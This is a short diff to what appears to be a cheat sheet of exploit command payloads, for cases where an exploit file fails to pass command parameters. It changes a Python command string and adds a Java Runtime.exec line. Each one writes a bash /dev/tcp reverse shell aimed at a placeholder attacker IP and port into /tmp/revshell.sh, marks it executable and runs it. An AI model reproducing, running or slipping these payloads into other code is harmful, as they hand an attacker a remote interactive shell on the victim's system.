@@ -129,8 +129,17 @@ sys.exit(0)
 
 When using the exploit file to pass command parameters fails
 
+python
+
 ```Python
-command = "echo '/bin/bash -i >& /dev/tcp/<host ip>/<host port> 0>&1' > /tmp/revshell.sh && chmod 777 /tmp/revshell.sh && /bin/bash /tmp/revshell.sh"
+command = "echo '/bin/bash -i >& /dev/tcp/<attacker ip>/<attacker port> 0>&1' > /tmp/revshell.sh && chmod 777 /tmp/revshell.sh && /bin/bash /tmp/revshell.sh"
+```
+
+java
+
+```Java
+String[] cmdline = { "sh", "-c", "echo 'bash -i >& /dev/tcp/<attacker ip>/<attacker port> 0>&1' > /tmp/revshell.sh && chmod 777 /tmp/revshell.sh && bash /tmp/revshell.sh" }; 
+Runtime.getRuntime().exec(cmdline);
 ```
 
 php(file)
